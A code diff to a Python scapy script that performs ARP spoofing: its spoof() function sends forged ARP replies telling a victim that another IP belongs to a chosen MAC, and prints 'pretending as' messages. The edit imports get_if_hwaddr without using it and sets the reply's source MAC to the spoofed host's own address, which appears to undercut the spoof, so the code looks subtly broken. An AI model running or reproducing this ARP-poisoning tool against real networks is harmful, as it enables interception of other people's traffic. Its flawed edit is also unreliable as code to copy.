@@ -1,5 +1,5 @@
 from scapy.layers.l2 import Ether,ARP,srp, sendp
-from scapy.all import send
+from scapy.all import send, get_if_hwaddr
 import sys
 
 # broadcast_mac = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -34,7 +34,8 @@ def spoof(victim_ip, spoof_ip):
     except Exception as e:
         print(f"Exception while get mac for {victim_ip}: {e}")
         return
-    packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip)
+    attacker_mac = get_mac(spoof_ip)
+    packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip, hwsrc=attacker_mac)
     send(packet, iface="eth0", verbose=False)
     print(f"[+] Spoofed {victim_ip} pretending as {spoof_ip}")
 
